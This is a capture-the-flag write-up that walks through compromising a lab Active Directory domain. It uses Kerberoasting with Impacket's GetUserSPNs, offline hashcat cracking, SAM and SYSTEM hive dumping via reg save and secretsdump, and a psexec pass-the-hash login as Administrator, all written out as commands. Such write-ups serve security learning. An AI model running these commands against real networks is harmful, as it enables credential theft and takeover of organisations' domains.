---
title: "Windows Active Directory Kerberoasting"
slug: "windows-kerberoasting"
category: "windows"
description: "Compromising a Windows Active Directory domain by Kerberoasting service accounts and cracking their TGS tickets offline."
date: "2024-07-02"
---

## Overview

This challenge simulated a corporate Active Directory environment. Starting with low-privilege domain credentials, the goal was to escalate to Domain Admin by targeting service accounts via Kerberoasting.

## Initial Foothold

Credentials were provided: `CORP\jsmith:Password123!`. Initial enumeration was performed using `crackmapexec`:

```bash
crackmapexec smb 10.10.14.100 -u jsmith -p 'Password123!' --shares
```

## Service Account Enumeration

Using `GetUserSPNs.py` from Impacket to identify Kerberoastable accounts:

```bash
GetUserSPNs.py CORP/jsmith:'Password123!' -dc-ip 10.10.14.100 -request
```

This returned a TGS ticket for the `svc_backup` service account.

## Cracking the Ticket

The TGS hash was saved and cracked with `hashcat`:

```bash
hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt --force
```

**Result**: `svc_backup:Backup2024!`

## Privilege Escalation

The `svc_backup` account had `SeBackupPrivilege`, allowing extraction of the SAM and SYSTEM hives:

```powershell
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
```

Using `secretsdump.py` to extract the Administrator NTLM hash and perform a pass-the-hash attack:

```bash
secretsdump.py -sam sam -system system LOCAL
psexec.py CORP/Administrator@10.10.14.100 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

## Tools Used

- Impacket (GetUserSPNs, secretsdump, psexec)
- CrackMapExec
- Hashcat
- PowerShell
